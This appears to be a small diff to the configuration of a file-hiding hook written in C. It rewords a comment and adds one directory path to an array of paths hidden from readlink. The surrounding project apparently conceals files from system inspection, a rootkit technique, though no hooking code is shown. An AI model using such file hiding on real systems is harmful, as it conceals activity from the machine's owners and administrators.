@@ -4,7 +4,7 @@
 #include <stdbool.h>
 #include <string.h>
 
-/* List of filepaths to hide from *readlink*. The files will be
+/* Array of filepaths to hide from *readlink*. The files will be
  * hidden, so for example, if you hide /path/to/dir/ it will
  * still be possible to list the contents of /path/to/dir. To
  * hide a whole directory, use the HIDDEN_DIRS array below.
@@ -15,6 +15,7 @@ const char *HIDDEN_FILES[] = {
 /* List of directories to hide from *readlink*
  */
 const char *HIDDEN_DIRS[] = {
+    "/home/tav/Projects/groot"
 };
 
 #define HIDDEN_FILES_NUM (sizeof(HIDDEN_FILES) / sizeof(char *))
